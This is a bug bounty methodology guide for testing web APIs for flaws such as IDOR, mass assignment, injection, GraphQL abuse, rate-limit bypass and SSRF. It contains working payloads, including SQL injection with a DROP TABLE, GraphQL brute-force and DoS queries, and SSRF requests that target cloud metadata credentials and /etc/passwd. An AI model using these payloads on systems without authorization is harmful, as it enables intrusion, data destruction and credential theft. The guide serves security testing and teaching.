# API Security Testing Methodology for Bug Bounty

## Phase 1: API Discovery

### Finding API Endpoints
1. **Documentation Discovery**
   - /api/docs, /swagger, /swagger-ui, /api-docs
   - /openapi.json, /openapi.yaml, /swagger.json
   - /v1/docs, /v2/docs, /graphql (GraphQL Playground)
   - /.well-known/openapi, /api/v1/openapi

2. **JavaScript Analysis**
   - Extract API calls from JS bundles
   - Look for axios/fetch calls with endpoint paths
   - Search for API_BASE_URL, API_KEY patterns
   - Tools: LinkFinder, JSParser, relative-url-extractor

3. **Traffic Analysis**
   - Proxy all traffic through Burp Suite
   - Map all API endpoints from normal app usage
   - Note authentication mechanisms used

4. **Wordlist-based Discovery**
   - API-specific wordlists for directory brute-forcing
   - Common API paths: /api/v1/users, /api/admin, etc.
   - Version enumeration: /api/v1/, /api/v2/, /api/v3/

## Phase 2: Authentication & Authorization

### Authentication Testing
- **Token Analysis**: Decode JWTs, check expiration, algorithm
- **Token Reuse**: Can expired tokens still work?
- **Token Leakage**: Tokens in URLs, logs, error messages?
- **Weak Token Generation**: Predictable tokens?
- **Missing Authentication**: Endpoints accessible without auth?

### Authorization Testing (BOLA/IDOR)
```
# Test pattern for BOLA:
1. Create two accounts (Account A and Account B)
2. As Account A, perform action → note the object ID
3. As Account B, try to access/modify Account A's object
4. Try with no authentication at all

# Common ID patterns to test:
- Sequential integers: /api/users/123 → /api/users/124
- UUIDs: Try enumeration or leaked UUIDs
- Encoded IDs: Base64 decode → modify → re-encode
- Composite keys: /api/org/1/user/2 → /api/org/1/user/3
```

### Broken Function-Level Authorization
```
# Escalation patterns:
- Regular user endpoints → admin endpoints
  /api/users/profile → /api/admin/users
  /api/user/settings → /api/admin/settings

- Method switching:
  GET /api/users (allowed) → DELETE /api/users/123 (forbidden?)
  GET /api/users (allowed) → PUT /api/users/123 (forbidden?)

- Adding admin parameters:
  POST /api/users {"name":"test"} → {"name":"test","role":"admin"}
  POST /api/users {"name":"test"} → {"name":"test","isAdmin":true}
```

## Phase 3: Input Validation

### Mass Assignment
```json
// Normal request:
POST /api/profile
{"name": "John", "email": "john@test.com"}

// Mass assignment attempt:
POST /api/profile
{"name": "John", "email": "john@test.com", "role": "admin", "isVerified": true, "balance": 99999}
```

### Injection Points
- **Headers**: Authorization, X-Forwarded-For, X-Real-IP, Referer, User-Agent
- **Query Parameters**: All GET parameters
- **Body Parameters**: JSON fields, XML fields
- **Path Parameters**: /api/users/{id}
- **File uploads**: Content-Type, filename

### SQL Injection in APIs
```
# JSON body injection:
{"username": "admin' OR '1'='1", "password": "test"}
{"id": "1 UNION SELECT 1,2,3--"}

# Query parameter injection:
/api/users?sort=name;DROP TABLE users--
/api/search?q=test' AND 1=1--
/api/items?filter={"$gt": ""}  (NoSQL)
```

### GraphQL-Specific
```graphql
# Introspection query (often left enabled):
{__schema{types{name,fields{name,type{name}}}}}

# Batch query for brute-force:
[
  {"query": "mutation { login(user:\"admin\",pass:\"pass1\") { token }}"},
  {"query": "mutation { login(user:\"admin\",pass:\"pass2\") { token }}"},
  {"query": "mutation { login(user:\"admin\",pass:\"pass3\") { token }}"}
]

# Field suggestion exploitation:
{user(id:1){__typename,id,email,password,ssn,creditCard}}

# Nested query DoS:
{user(id:1){friends{friends{friends{friends{name}}}}}}
```

## Phase 4: Rate Limiting & Resource

### Rate Limit Bypass Techniques
- IP rotation via X-Forwarded-For header variations
- Using different API versions (/v1/ vs /v2/)
- Parameter pollution
- Changing case of endpoints
- Adding path separators: /api/login vs /api/./login
- Using different HTTP methods
- Adding random query parameters

### Resource Exhaustion
- Large pagination values: ?page=1&per_page=999999
- Excessive field selection in GraphQL
- Large file uploads
- Long string inputs
- Deep nested JSON objects

## Phase 5: Data Exposure

### Excessive Data Exposure Checks
```
# Look for extra fields in responses:
GET /api/users/me
Response: {"id":1,"name":"test","email":"test@test.com",
           "password_hash":"$2b$...",  ← Sensitive!
           "ssn":"123-45-6789",         ← Sensitive!
           "internal_notes":"VIP user"  ← Sensitive!
          }

# Check different response formats:
Accept: application/json
Accept: application/xml
Accept: text/csv

# Verbose error messages revealing internals:
- Stack traces
- Database queries
- Internal IPs/paths
- Framework versions
```

## Phase 6: Business Logic in APIs

### Common API Business Logic Flaws
1. **Price manipulation**: Change price in request body
2. **Quantity manipulation**: Negative values, zero amounts
3. **Coupon abuse**: Reuse, stack, apply to wrong items
4. **Race conditions**: Parallel requests for one-time actions
5. **Step skipping**: Complete checkout without payment
6. **ID manipulation**: Change order IDs, user IDs in requests

### Race Condition Testing
```bash
# Using curl with parallel requests:
for i in $(seq 1 20); do
  curl -X POST https://api.target.com/api/redeem-coupon \
    -H "Authorization: Bearer TOKEN" \
    -d '{"coupon":"SAVE50"}' &
done
wait

# Using Turbo Intruder in Burp Suite for single-packet attacks
```

## Phase 7: API-Specific Attacks

### SSRF via API
```json
// Webhook/callback URLs:
POST /api/webhooks
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://internal-service:8080/admin"}
{"url": "file:///etc/passwd"}

// Import/fetch features:
POST /api/import
{"source_url": "http://localhost:6379/"}

// PDF/image generation:
POST /api/generate-pdf
{"html": "<img src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'>"}
```

### API Key / Secret Exposure
- Check JavaScript source for hardcoded API keys
- Test API keys in Postman/curl for scope
- Check for key rotation and revocation
- Test if keys can be used from any IP
- Look for keys in: mobile app decompilation, git history, error messages

## Common API Vulnerability Patterns by Technology

### REST API
- BOLA/IDOR on resource endpoints
- Missing auth on admin endpoints
- Mass assignment on PUT/PATCH
- SQL injection via query parameters

### GraphQL
- Introspection enabled in production
- Missing authorization on resolvers
- Batch attacks for brute-force
- Nested query DoS

### gRPC
- Reflection enabled in production
- Missing authentication metadata
- Insecure channel (no TLS)
- Method enumeration

### WebSocket
- Missing origin validation
- No authentication on messages
- Injection via message content
- Cross-site WebSocket hijacking
